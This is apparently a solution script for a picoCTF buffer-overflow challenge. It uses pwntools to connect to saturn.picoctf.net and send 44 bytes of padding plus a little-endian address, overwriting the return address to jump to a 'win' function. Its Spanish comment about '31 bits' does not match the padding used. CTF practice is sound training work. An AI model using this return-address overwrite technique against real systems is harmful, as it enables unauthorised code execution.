from pwn import * # pip install pwntools
import json

r = remote('saturn.picoctf.net', 64960, level='debug')

def exploit():
    relleno= b'A' * 44 #rellenamos los primeros 31 bits y comenzamos a escribir a partir del 32 saltandonos directamente a la funcion win
    direc= 0x080491f6
    num = direc.to_bytes(4,byteorder="little")
    return relleno+num

def recv():
    line = r.recv(4096)
    return line.decode('utf-8')

def printer():
    nt="s"
    while(len(nt)):
    	nt = recv()
    	print(nt)
    return

def send(txt):
    request = txt
    r.sendline(request)
    return

aux = recv()

txt = 'A'*117

send(exploit())

printer()


